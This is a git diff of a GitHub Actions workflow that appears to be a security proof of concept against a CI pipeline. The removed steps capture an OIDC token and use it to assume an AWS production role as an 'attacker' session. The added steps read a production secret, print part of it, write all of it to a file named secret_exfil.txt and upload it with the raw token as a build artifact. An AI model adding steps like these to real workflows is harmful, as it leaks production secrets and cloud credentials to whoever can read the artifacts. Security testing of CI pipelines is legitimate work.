@@ -10,50 +10,31 @@ jobs:
   oidc-full-token:
     runs-on: ubuntu-latest
     environment: production
+    env:
+      PROD_SECRET: ${{ secrets.PROD_SECRET }}
     steps:
-      - name: Capture OIDC JWT and decode payload
+      - name: Capture OIDC JWT
         run: |
           FULL_JWT=$(curl -sS \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           echo "$FULL_JWT" > /tmp/oidc_token.txt
           PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
-          echo "=== OIDC Token Payload ===" 
           echo "$PAYLOAD" | python3 -c "
           import sys, base64, json
           d = sys.stdin.read().strip()
           p = d + '=' * (4 - len(d) % 4)
           print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))"
-
-      - name: Assume AWS IAM Role using spoofed OIDC token
+      - name: Show environment secret value
         run: |
-          FULL_JWT=$(cat /tmp/oidc_token.txt)
-          echo "=== Calling aws sts assume-role-with-web-identity ==="
-          STS_RESULT=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::274196201170:role/GitHubOIDC-ProdDeployment-VulnPoC" \
-            --role-session-name "attacker-fork-pr-session" \
-            --web-identity-token "$FULL_JWT" \
-            --duration-seconds 900 2>&1) || true
-          echo "$STS_RESULT"
-          echo "$STS_RESULT" > /tmp/sts_result.txt
-          # Extract temp credentials if successful
-          ACCESS_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.AccessKeyId // empty' 2>/dev/null)
-          if [ -n "$ACCESS_KEY" ]; then
-            echo "=== ROLE ASSUMED SUCCESSFULLY ==="
-            export AWS_ACCESS_KEY_ID=$(echo "$STS_RESULT" | jq -r '.Credentials.AccessKeyId')
-            export AWS_SECRET_ACCESS_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.SecretAccessKey')
-            export AWS_SESSION_TOKEN=$(echo "$STS_RESULT" | jq -r '.Credentials.SessionToken')
-            echo "=== aws sts get-caller-identity (as assumed role) ===" 
-            aws sts get-caller-identity | tee /tmp/caller_identity.txt
-          fi
-        env:
-          AWS_DEFAULT_REGION: us-east-1
-
+          echo "Secret length: ${#PROD_SECRET}"
+          echo "Secret starts with: ${PROD_SECRET:0:4}"
+          echo "$PROD_SECRET" > /tmp/secret_exfil.txt
+          echo "Full secret exfiltrated to artifact"
       - uses: actions/upload-artifact@v4
         with:
-          name: oidc-aws-poc
+          name: oidc-secret-poc
           path: |
             /tmp/oidc_token.txt
-            /tmp/sts_result.txt
-            /tmp/caller_identity.txt
+            /tmp/secret_exfil.txt
           retention-days: 1
